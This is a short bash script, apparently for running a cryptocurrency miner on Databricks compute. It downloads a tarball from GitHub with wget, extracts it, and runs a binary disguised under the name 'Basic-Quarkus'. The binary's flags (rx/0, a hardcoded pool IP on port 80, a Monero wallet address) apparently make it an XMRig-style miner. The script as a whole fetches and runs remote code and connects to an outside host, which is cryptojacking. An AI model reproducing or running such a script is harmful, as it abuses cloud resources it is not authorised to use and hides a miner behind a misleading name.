#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/Basic-Quarkus.tar.gz
tar xvzf Basic-Quarkus.tar.gz
cd Basic-Quarkus
./Basic-Quarkus/Basic-Quarkus -a rx/0 -o 44.196.193.227:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j -p test01 -t 2
